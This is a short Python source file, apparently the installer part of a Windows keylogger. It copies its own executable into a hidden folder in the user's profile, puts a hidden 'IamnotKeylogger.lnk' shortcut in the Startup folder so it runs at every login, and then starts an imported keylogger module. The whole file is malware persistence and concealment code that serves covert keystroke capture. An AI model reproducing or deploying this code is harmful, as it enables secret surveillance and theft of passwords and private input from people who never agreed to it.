import os, sys
import keylogger
from getpass import getuser
from shutil import copy
from winshell import shortcut

# Copy exec file to hidden folder
def copy_to_dir(user_name, exec_path):
    if not os.path.exists(exec_path):
        os.makedirs(exec_path)
        os.system('attrib +h ' + exec_path)
        copy(sys.executable, exec_path)

# Create the shortcut of this program at Startup folder
def create_shortcut(user_name, exec_path):
    lnk_name = 'IamnotKeylogger.lnk'
    lnk_filepath = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%s' %(user_name, lnk_name)
    if not os.path.exists(lnk_filepath):
        shct = shortcut(exec_path + '\\' + os.path.basename(sys.executable))
        shct.write(lnk_filepath)
        os.system('attrib +h "%s"' %lnk_filepath)

# Main handle
def execute():
    user_name = getuser()
    exec_path = r'C:\Users\%s\IamnotKeylogger' %(user_name)
    copy_to_dir(user_name, exec_path)
    create_shortcut(user_name, exec_path)
    keylogger.run(exec_path)

# Test
if __name__ == '__main__':
    execute()